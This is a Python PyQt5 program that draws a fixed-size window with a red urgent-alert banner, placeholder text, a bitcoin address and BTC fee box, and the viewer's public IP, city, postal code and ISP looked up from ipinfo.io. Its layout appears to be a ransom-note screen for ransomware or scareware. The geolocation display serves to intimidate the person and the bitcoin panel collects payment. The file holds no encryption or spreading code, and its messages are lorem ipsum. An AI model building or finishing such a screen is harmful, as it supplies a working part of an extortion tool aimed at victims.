import sys
import os

import requests
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QHBoxLayout, QTextEdit, QGridLayout, QScrollArea
from PyQt5.QtGui import QPixmap, QTextCursor, QColor, QImage, QPainter
from PyQt5.QtCore import Qt
from dotenv import load_dotenv

load_dotenv()


class MyApp(QWidget):
    def __init__(self):
        super().__init__()
        style_sheet = 'background-color: #232323; color: white;'
        self.setStyleSheet(style_sheet)
        self.setWindowTitle("My App")
        self.setGeometry(100, 100, 1200, 700)  # Set your preferred window size
        self.setWindowFlag(Qt.WindowMaximizeButtonHint, False)
        self.access_token = os.environ.get("ACCESS_TOKEN")
        self.base_route = "../assets/"
        self.local_messages = {
            "alert_message": "SOME URGENT MESSAGE HERE",
            "info_message": "Lorem ipsum dolor sit amet",
            "red_heading": "Insert some red text here",
            "right_side_description": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua, incididunt ut labore et dolore magna aliqua. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod",
            "bitcoin_address": "Here bitcoin address:",
            "bitcoin_fee": "Here a fee in BTC:",
            "left_container_900_words": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed vel sapien vel odio efficitur scelerisque id a felis. Vivamus eu sapien vel ante lobortis venenatis. Suspendisse potenti. Proin vitae fermentum arcu. Pellentesque ut turpis vel purus facilisis varius. Integer at eros sit amet massa imperdiet posuere vel id elit. Sed non erat vitae lacus fermentum tincidunt a sit amet justo. Maecenas malesuada lectus vel massa gravida, at cursus sapien pellentesque. Quisque nec efficitur velit. Aliquam erat volutpat. Duis vel purus vel orci accumsan feugiat. Nullam eu quam ut dui bibendum vestibulum. Aenean bibendum augue in elit iaculis, ac scelerisque risus cursus. Fusce eu metus at enim consectetur gravida. Nunc sit amet tristique turpis. Etiam non risus ut turpis congue vestibulum id in nunc. Maecenas ac quam at justo pharetra euismod in nec libero. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Ut quis mi vel neque luctus gravida. Suspendisse potenti. Mauris eu dolor nec mauris eleifend consectetur. Nunc auctor arcu eget fermentum dictum. Sed ultrices ante id libero bibendum, vel dapibus nulla tincidunt. Proin posuere ligula vel quam tincidunt varius. Vivamus malesuada, odio id tincidunt tincidunt, turpis augue fermentum justo, et varius libero velit a augue. Donec vel arcu in mi pulvinar consectetur vel eget purus. Fusce a nisl et justo euismod dignissim. Nulla facilisi. Curabitur feugiat est vel justo accumsan, vitae sodales quam pulvinar. Aenean dictum nisi nec purus efficitur, ut feugiat purus aliquet. Sed nec tellus eu orci congue facilisis nec vel leo. Morbi vulputate, elit vel volutpat bibendum, elit eros tristique odio, id fermentum augue elit non urna. Fusce ut nunc quis turpis imperdiet blandit vel eget enim. Vivamus ullamcorper semper neque, vitae condimentum metus. Integer ut felis vitae nisi ullamcorper ultricies. Etiam eget ullamcorper leo. Phasellus varius, massa non fermentum tempus, ex metus interdum felis, et fermentum neque sem a orci. Ut vel quam a lacus consequat posuere. Nunc venenatis urna eu risus suscipit, vel congue libero varius. Fusce lacinia mi in felis pharetra, sit amet eleifend dolor auctor. Sed dapibus ipsum at commodo venenatis. Nunc vel velit sit amet urna accumsan sollicitudin. Integer auctor justo vel magna fermentum, at ultricies nunc congue. Fusce a tortor eget sapien malesuada convallis vel non libero. Morbi nec tellus in dolor congue laoreet. Aenean in risus in tortor iaculis tempus. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Proin eget dolor vel dui fermentum elementum. In hac habitasse platea dictumst. Nulla facilisi. Sed gravida fringilla lectus, in commodo odio euismod vel. Vestibulum dapibus hendrerit lorem, a scelerisque purus cursus id. In hac habitasse platea dictumst. Sed congue finibus lectus, vel tincidunt arcu posuere eget. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Aenean in ligula eu tellus luctus consequat. Suspendisse potenti. Nullam id tortor id purus vulputate eleifend. Vestibulum quis metus nec nisl euismod facilisis id vel tortor. Sed dapibus tortor vel ligula bibendum, non fermentum nisi dictum. Fusce tincidunt ultricies justo, nec laoreet urna laoreet ac. Phasellus ac arcu eu velit tincidunt tincidunt. Aenean mattis justo eu mi ullamcorper, vel cursus libero ultrices. Integer tristique turpis eu lorem tincidunt, id rhoncus felis sollicitudin. Vivamus accumsan, purus vel cursus tincidunt, justo elit blandit velit, a dictum libero justo sed libero. Sed euismod elit nec felis auctor, a consequat libero dictum. Quisque vel mauris sit amet nulla tempus hendrerit. Nullam laoreet sem non quam suscipit, non fermentum ligula tristique. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Sed vel nibh et tortor tincidunt dictum a vitae justo. Praesent luctus facilisis leo, vel congue ex fringilla et. Sed a quam nec augue tincidunt sagittis. Vestibulum auctor, libero nec malesuada fringilla, augue urna convallis est, a posuere sapien felis et velit. Vivamus vel quam nec nulla facilisis fermentum. Curabitur eu elit vel turpis scelerisque dignissim ut non sem. Sed rhoncus elit quis ante hendrerit, ac lacinia urna scelerisque. Suspendisse potenti. Nam consectetur sapien vel lacinia aliquet. Sed nec ex justo. Duis sed risus a augue ultrices tincidunt. Curabitur vel sapien at purus tincidunt aliquet a non sem. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Ut vel sapien quis dolor auctor hendrerit in nec libero. Sed nec sem id nunc vestibulum aliquet nec id enim. Vestibulum eget ullamcorper arcu. Nulla facilisi. Ut vulputate gravida turpis, eu fermentum quam mattis a. Integer ac sapien nec lacus efficitur sagittis nec id libero. Maecenas suscipit lectus a aliquam vulputate. Morbi ac erat id metus interdum vulputate. Nullam id arcu quis neque bibendum ullamcorper. Proin at neque et turpis luctus semper. Curabitur condimentum bibendum est, in tristique urna laoreet vitae. Proin semper bibendum est, eu fringilla mi euismod et. Suspendisse eu nunc vel justo congue gravida at vel mi. Sed id dolor nec turpis vestibulum bibendum. Ut tincidunt aliquet sapien, non facilisis quam aliquet ut. Phasellus fringilla consectetur cursus. Quisque sit amet massa nec tortor ultricies ultricies. Aenean dignissim tellus ac imperdiet scelerisque. Integer et interdum felis. Nullam semper purus eu leo pellentesque tristique. Vestibulum vestibulum scelerisque nisi, ut bibendum odio feugiat vitae. Aliquam erat volutpat. Etiam vel dapibus velit. Curabitur aliquet sapien in tellus dignissim, at luctus libero dapibus. Sed eget magna bibendum, auctor erat vel, aliquam est. Donec venenatis sagittis odio, nec fermentum dolor dignissim vel. Integer vel malesuada felis, vitae bibendum quam. Sed at fermentum urna. Etiam vel vestibulum lacus, id euismod velit. Fusce at dapibus velit, nec cursus justo. Nulla facilisi. Sed vestibulum, nunc nec malesuada bibendum, libero quam ultricies elit, nec auctor nisi arcu eu metus. Integer gravida elit vel nunc efficitur, eu vulputate risus dignissim. Nullam eget nunc ut nulla fringilla lacinia. Aenean at mi eu elit bibendum tincidunt. Suspendisse potenti. Vestibulum id tortor nec augue eleifend scelerisque. Sed ultricies elit eu dolor accumsan, at iaculis nulla congue. Nulla facilisi. Nulla facilisi. Phasellus fermentum est sed lectus tincidunt, eu auctor sapien scelerisque. Morbi tincidunt, dui ut laoreet fringilla, velit tortor malesuada odio, nec dignissim velit eros sit amet libero. Sed varius felis ut quam tincidunt, vitae bibendum est suscipit. Aliquam a dapibus libero. Nam eget sagittis sem. Sed efficitur elit a tellus tincidunt, id suscipit libero fermentum. Nam accumsan mauris sit amet lacus imperdiet, ut convallis felis fringilla. Ut aliquet velit eu ante fermentum, eu rhoncus dolor congue. Pellentesque nec semper nunc. Integer accumsan ligula vitae justo vulputate, et ullamcorper justo fermentum. Integer consectetur odio vel aliquet ultrices. Sed bibendum euismod neque, vitae vulputate quam vulputate eu. Praesent suscipit nisl ut est sodales cursus. Integer rhoncus, justo sit amet tristique rhoncus, turpis arcu iaculis velit, ac egestas nunc nisl vitae libero. Curabitur eu nunc vel mauris fermentum sollicitudin id vel odio. Curabitur ut nulla vitae nisi vehicula tincidunt. Proin ullamcorper urna eget sapien cursus, vel ultrices risus scelerisque. Nulla facilisi. Sed at urna quam. Duis dapibus urna vel efficitur sodales. Morbi bibendum, tortor ut pellentesque elementum, libero metus volutpat nunc, sit amet fringilla elit tortor non mi. Ut non libero vitae felis scelerisque gravida ut vel enim. Vivamus vitae tincidunt quam, nec fermentum dolor. Fusce at orci vel augue feugiat suscipit. In vel nunc vitae felis luctus bibendum at quis neque. Aliquam non lectus ut libero accumsan euismod. Aliquam vestibulum efficitur lorem ut finibus. Curabitur dictum nisl vel cursus rhoncus. Integer eget quam vel enim volutpat tincidunt. Ut bibendum erat ut lacus blandit, eu fermentum libero imperdiet. Nullam tristique eros non metus tristique, ut eleifend urna fringilla. Fusce vel dolor sit amet velit imperdiet efficitur. Ut nec lacinia neque. Vivamus vel semper neque. Integer mattis, urna ut aliquam tincidunt, tellus odio congue elit, nec luctus purus nulla a justo. Duis nec sapien ut quam egestas efficitur. Vivamus eu lectus euismod, euismod turpis ac, efficitur elit. Quisque nec mi vel metus consequat vulputate. Aenean vehicula bibendum felis, vitae tincidunt elit fermentum non. Quisque dapibus, nunc non lacinia dictum, justo tellus congue odio, vel fringilla felis turpis nec nulla. Vestibulum id mauris purus. Proin dapibus luctus nunc, a pulvinar quam tincidunt ac. Ut quis felis auctor, sodales justo nec, accumsan neque. Integer vel diam quis libero tincidunt volutpat sit amet vel justo. Mauris sagittis, sapien at luctus facilisis, sem nisi efficitur sem, at suscipit lectus est vitae mi. In hac habitasse platea dictumst. Integer bibendum nisl a velit scelerisque, vitae varius turpis bibendum. Phasellus feugiat justo quis purus scelerisque eleifend. Quisque at convallis neque, ut volutpat odio. Vestibulum auctor vitae odio eu accumsan. Vestibulum feugiat felis eu massa cursus tincidunt. Proin varius libero non nisl fermentum rhoncus. Aliquam nec commodo nulla. Duis non risus sed lacus volutpat egestas vel at libero. Integer tristique tristique nisi, ut gravida nisi luctus ac. Suspendisse euismod purus a dictum fermentum. Aliquam vel ex id libero blandit sollicitudin nec at est. Nam in orci vel est laoreet luctus. Nulla facilisi. Vivamus nec arcu non ex blandit venenatis. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Nam condimentum vel metus vel sagittis. Sed consequat vestibulum erat, et facilisis purus hendrerit ac. Curabitur rhoncus efficitur tellus, vel fermentum quam tincidunt vel. Aliquam nec dui sagittis, mattis odio vitae, euismod leo. Vestibulum sodales, mauris sit amet hendrerit fermentum, sapien neque fermentum felis, vel congue arcu orci id libero. Phasellus ultrices quam vel fermentum pellentesque. Aenean sit amet facilisis quam. Quisque vehicula odio vel purus tincidunt, vel venenatis libero auctor. Integer ut justo vel ris"
        }
        self.init_ui()

    @staticmethod
    def get_public_ip():
        try:
            response = requests.get('https://ipinfo.io/')
            data = response.json()
            return data['ip']
        except Exception as e:
            return f"Error: {str(e)}"

    def get_info(self):
        ip_address = self.get_public_ip()
        url = f"https://ipinfo.io/{ip_address}?token={self.access_token}"
        response = requests.get(url)
        data = response.json()
        print(data)

        information = f"IP: {data['ip']}\n" \
                      f"City: {data.get('city', 'N/A')}\n" \
                      f"Region: {data.get('region', 'N/A')}\n" \
                      f"Country: {data.get('country', 'N/A')}\n" \
                      f"Location: {data.get('loc', 'N/A')}\n" \
                      f"Postal Code: {data.get('postal', 'N/A')}\n" \
                      f"Timezone: {data.get('timezone', 'N/A')}\n" \
                      f"Org: {data.get('company', {}).get('domain', 'N/a')}\n" \
                      f"ASN: {data.get('asn', {}).get('name', 'N/A')}"
        return information

    @staticmethod
    def chunk_string(string, chunk_size):
        words = string.split()
        return [' '.join(words[i:i + chunk_size]) for i in range(0, len(words), chunk_size)]

    @staticmethod
    def apply_white_filter(image_path, target_color):
        pixmap = QPixmap(image_path)
        image = pixmap.toImage()

        # Get the target color
        target_qcolor = QColor(*target_color)

        # Create a new QImage with the same size and format as the original
        new_image = QImage(image.size(), QImage.Format_ARGB32)
        new_image.fill(Qt.white)  # Fill the new image with white

        # Use QPainter to draw the original image onto the new image, replacing the target color with white
        painter = QPainter(new_image)
        for y in range(image.height()):
            for x in range(image.width()):
                pixel_color = QColor(image.pixel(x, y))
                if pixel_color == target_qcolor:
                    new_image.setPixel(x, y, QColor(Qt.white).rgba())
                else:
                    new_image.setPixel(x, y, image.pixel(x, y))

        painter.end()

        return QPixmap.fromImage(new_image)

    def init_ui(self):
        # Top Placeholder Banner Image
        banner_image_path = f"{self.base_route}banner.png"  # Replace with actual path
        banner_label = QLabel()
        banner_pixmap = QPixmap(banner_image_path)
        banner_pixmap = banner_pixmap.scaled(800, 100, Qt.KeepAspectRatio)
        banner_label.setFixedHeight(100)
        banner_label.setPixmap(banner_pixmap)
        banner_label.setScaledContents(True)

        alert_label = QLabel()
        alert_label.setStyleSheet('font-size: 18px; font-weight: 700; background-color: red; color: white;')
        alert_label.setAlignment(Qt.AlignCenter)
        alert_label.setFixedHeight(35)

        # Image Widgets
        left_image = QLabel()
        right_image = QLabel()

        image_width = 17
        image_height = 17
        left_image_path = f"{self.base_route}alert.png"
        left_image_path = self.apply_white_filter(left_image_path, (128, 128, 128) )

        left_pixmap = QPixmap(left_image_path).scaled(image_width, image_height)
        right_pixmap = QPixmap(left_image_path).scaled(image_width, image_height)

        left_image.setPixmap(left_pixmap)
        right_image.setPixmap(right_pixmap)
        left_image.setAlignment(Qt.AlignCenter)
        right_image.setAlignment(Qt.AlignCenter)

        text_label = QLabel(f"{self.local_messages['alert_message']}")
        text_label.setStyleSheet('font-size: 20px; font-weight: 700; color: white;')

        alert_layout = QHBoxLayout()
        alert_layout.addWidget(left_image)
        alert_layout.addWidget(text_label)
        alert_layout.addWidget(right_image)
        alert_label.setLayout(alert_layout)

        info_label = QLabel(self.local_messages["info_message"])
        info_label.setStyleSheet('font-size: 18px; font-weight: 400; background-color: black; color: white;')
        info_label.setAlignment(Qt.AlignCenter)
        info_label.setFixedHeight(30)

        # Left side of window
        left_widget = QWidget(self)
        left_layout = QVBoxLayout(left_widget)
        left_layout.setContentsMargins(0, 0, 0, 0)
        text_scroll_area = QScrollArea(self)
        text_widget = QWidget(self)
        text_layout = QVBoxLayout(text_widget)
        text_layout.setContentsMargins(0, 0, 0, 0)

        lorem_ipsum_text = self.local_messages["left_container_900_words"]

        lorem_label = QLabel(lorem_ipsum_text, left_widget)
        lorem_label.setFixedWidth(590)
        lorem_label.setStyleSheet(
            "font-size: 18px; padding: 10px 0px 0px 10px; font-weight: 700; background-color: black;")
        lorem_label.setWordWrap(True)
        text_layout.addWidget(lorem_label)
        text_scroll_area.setWidget(text_widget)
        text_scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
        text_scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        left_layout.addWidget(text_scroll_area)

        ip_info_scroll_area = QScrollArea(self)
        ip_info_widget = QWidget(self)
        ip_info_widget.setFixedWidth(590)
        ip_info_widget.setStyleSheet("font-size: 18px; padding: 10px 0px 0px 10px; font-weight: 700; background-color: black;")
        ip_info_layout = QVBoxLayout(ip_info_widget)
        ip_info_layout.setContentsMargins(0, 0, 0, 0)

        ip_info_label = QLabel("ip-info", left_widget)
        ip_info_label.setAlignment(Qt.AlignCenter)
        ip_info_label.setWordWrap(True)
        ip_info_text = QLabel(self.get_info(), left_widget)
        ip_info_text.setAlignment(Qt.AlignCenter)
        ip_info_text.setStyleSheet("background-color: white; color: black; margin: 0px 10px 10px 10px; border-radius: 10px; padding: 10px 0px 10px 0px;")
        ip_info_layout.addWidget(ip_info_label)
        ip_info_layout.addWidget(ip_info_text)

        ip_info_scroll_area.setWidget(ip_info_widget)
        ip_info_scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
        ip_info_scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        left_layout.addWidget(ip_info_scroll_area)

        goods_widget = QWidget(self)
        goods_widget.setStyleSheet(
            "font-size: 18px; padding: 10px 0px 10px 10px; font-weight: 700; background-color: black;")
        goods_layout = QVBoxLayout(goods_widget)
        goods_layout.setContentsMargins(0, 0, 0, 0)
        goods_image_layout = QGridLayout()
        image_paths = [
            f"{self.base_route}bitcoinacceptedcompony.png",
            f"{self.base_route}bitcoinacceptedcompony.png",
            f"{self.base_route}bitcoinacceptedcompony.png",
            f"{self.base_route}bitcoinacceptedcompony.png",
        ]

        row = 0
        col = 0

        for path in image_paths:
            image_label = QLabel()
            pixmap = QPixmap(path).scaled(100, 50)
            image_label.setPixmap(pixmap)
            goods_image_layout.addWidget(image_label, row, col)

            col += 1
            if col == 4:
                col = 0
                row += 1
        goods_layout.addLayout(goods_image_layout)
        left_layout.addWidget(goods_widget)

        # Right side of window
        right_widget = QWidget(self)
        right_widget.setStyleSheet("background-color: #e9edde; color: black; margin: 5px;")
        right_layout = QVBoxLayout(right_widget)
        right_layout.setContentsMargins(0, 0, 0, 0)
        heading_label = QLabel(self.local_messages["red_heading"], right_widget)
        heading_label_style = ("background-color: #232323; color: red; padding-bottom: 4px; padding-top: 0px;"
                               " font-size: 17px; font-weight: 700;")
        heading_label.setStyleSheet(heading_label_style)
        heading_label.setAlignment(Qt.AlignCenter)
        right_layout.addWidget(heading_label)

        description_label = QLabel(self.local_messages["right_side_description"], right_widget)
        description_label.setWordWrap(True)  # Enable word wrapping
        description_label.setStyleSheet("font-weight: 700; margin-left: 10px; font-size: 19px;")
        right_layout.addWidget(description_label)

        address_text = QTextEdit(right_widget)
        cursor = QTextCursor(address_text.document())
        cursor.movePosition(QTextCursor.End)

        image_path = f"{self.base_route}bitcoin.png"
        pixmap = QPixmap(image_path).scaled(50, 50, Qt.KeepAspectRatio)
        image = pixmap.toImage()
        cursor.insertImage(image)
        address_text.setReadOnly(True)
        bitcoin_address = self.local_messages["bitcoin_address"]
        bitcoin_fee = self.local_messages["bitcoin_fee"]
        address_text_style = ("padding: 20px; margin: 10px 0px 0px 10px; font-size: 19px; font-weight:700;"
                              " background-color: white; border: 1px solid grey; border-radius: 10px;")
        address_text.setStyleSheet(address_text_style)
        address_text.append(f"\n\n{bitcoin_address}")
        address_text.append(f"{bitcoin_fee}")

        graphic_representation = QLabel(right_widget)
        pixmap = QPixmap(f"{self.base_route}bitcoinpaymentmethod.png").scaled(150, 300)
        graphic_representation.setPixmap(pixmap)
        graphic_representation.setStyleSheet("margin-top: 9px;")

        text_and_image_layout = QHBoxLayout(right_widget)
        text_and_image_layout.setContentsMargins(0, 0, 0, 0)
        text_and_image_layout.setSpacing(0)

        text_and_image_layout.addWidget(address_text)
        text_and_image_layout.addWidget(graphic_representation)
        right_layout.addLayout(text_and_image_layout)

        image_grid_layout = QGridLayout()
        image_paths = [
            f"{self.base_route}bitcoinacceptedcompony.png",
            f"{self.base_route}bitcoinacceptedcompony.png",
            f"{self.base_route}bitcoinacceptedcompony.png",
            f"{self.base_route}bitcoinacceptedcompony.png",
        ]

        row = 0
        col = 0

        for path in image_paths:
            image_label = QLabel()
            image_label.setStyleSheet("margin-left: 10px; margin-bottom: 20px; margin-right: 5px;")
            pixmap = QPixmap(path).scaled(100, 50)
            image_label.setPixmap(pixmap)
            image_grid_layout.addWidget(image_label, row, col)

            col += 1
            if col == 4:
                col = 0
                row += 1

        right_layout.addLayout(image_grid_layout)

        # # Layout
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.addWidget(banner_label)
        main_layout.addWidget(alert_label)
        main_layout.addWidget(info_label)

        columns_layout = QHBoxLayout()
        columns_layout.addWidget(left_widget)
        columns_layout.addWidget(right_widget)
        main_layout.addLayout(columns_layout)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MyApp()
    window.setMaximumWidth(1200)
    window.setMinimumWidth(1200)
    window.setMaximumHeight(700)
    window.setMinimumHeight(700)
    window.show()
    sys.exit(app.exec_())
